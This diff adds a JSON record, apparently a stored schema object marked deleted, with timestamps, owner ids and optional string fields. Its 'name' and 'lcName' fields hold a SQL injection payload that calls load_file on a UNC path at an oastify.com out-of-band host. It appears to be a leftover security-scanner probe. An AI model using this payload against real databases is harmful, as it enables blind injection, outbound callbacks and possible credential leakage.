@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334398842,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa77e8780f31288254d44",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"(select load_file('\\\\\\\\8bkfemgfcir84q19n7g9yukqmhsagb426qydo1d.oastify.com\\\\bbn'))",
+	"modifiedTime":1741358660588,
+	"name":"(select load_file('\\\\\\\\8bkfemgfcir84q19n7g9yukqmhsagb426qydo1d.oastify.com\\\\bbn'))",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
